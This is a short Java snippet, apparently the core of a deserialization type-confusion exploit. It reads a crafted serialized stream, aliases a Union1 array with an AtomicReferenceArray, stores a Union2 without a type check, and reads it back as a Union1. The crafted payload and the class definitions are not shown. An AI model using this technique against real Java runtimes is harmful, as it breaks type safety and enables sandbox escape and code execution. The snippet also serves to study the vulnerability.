ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(crafted));
Object[] arr = (Object[]) ois.readObject();
Union1[] u1 = (Union1[]) arr[0];
AtomicReferenceArray ara = (AtomicReferenceArray) arr[1];
ara.set(0, new Union2()); // No type check via Unsafe
Union1 confused = u1[0]; // Actually a Union2 — type confusion
